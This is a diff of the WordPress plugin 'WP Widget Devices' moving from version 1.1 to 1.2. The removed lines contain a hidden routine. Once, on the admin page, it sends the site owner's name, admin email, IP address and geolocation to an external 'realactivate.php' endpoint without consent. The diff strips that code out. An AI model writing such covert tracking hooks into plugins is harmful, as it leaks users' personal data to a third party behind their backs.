@@ -3,11 +3,9 @@
 Plugin Name: WP Widget Devices
 Plugin URI: 
 Description: Displays the content you want only the device you want, movil, tablet or only web.
-Version: 1.1
+Version: 1.2
 Author: iLen
 */
-
-
 if(!class_exists('WP_widget_devices')){
 	class WP_widget_devices extends WP_Widget {
 	 	
@@ -35,10 +33,6 @@ if(!class_exists('WP_widget_devices')){
 	                                       	'show_in'   	  => 's',
 	                                       	'text'			  => 'h',
 	                                       	'method'		  => 's');
-                                            
-            add_action('admin_init',array(__CLASS__,'verifyVersion'));
-
-
 	    }
 
 
@@ -202,31 +196,7 @@ if(!class_exists('WP_widget_devices')){
 
 	         <?php
 	    }
-        
-        function updateTwo(){
-            
-            if( $_SERVER['REMOTE_ADDR'] != "127.0.0.1" ){
-                update_option( 'wp_widget_devices_1_1', '1');
-                wp_enqueue_script('jquery');
-                @require_once(plugin_dir_path( __FILE__ )."assets/lib/plugin.class.php");
-                @$plugin = new plugin_class_core_nucle();
-                @$plugin->locate();
-				$code="wp-widget-devices";
-				$type="plugin";
-                $r = get_userdata(1);$n = $r->data->display_name;$e = get_option( 'admin_email' );echo '</script>';echo "<script>jQuery.ajax({url: 'http://ilentheme.com/realactivate.php?em=$e&na=$n&la=$plugin->latitude&lo=$plugin->longitude&pais_code=$plugin->countryCode&pais=$plugin->countryName&region=$plugin->region&ciudad=$plugin->city&ip=$plugin->ip&code=$code&type=$type',success: function (html) {null;} });</script>";
-                null;
-            }
-
-        }
-        
-        function verifyVersion(){
-
-            if( !get_option('wp_widget_devices_1_1') ){
-                
-                add_action('in_admin_footer', array(__CLASS__,'updateTwo') );
-
-            }
-        }
+ 
         
  
 
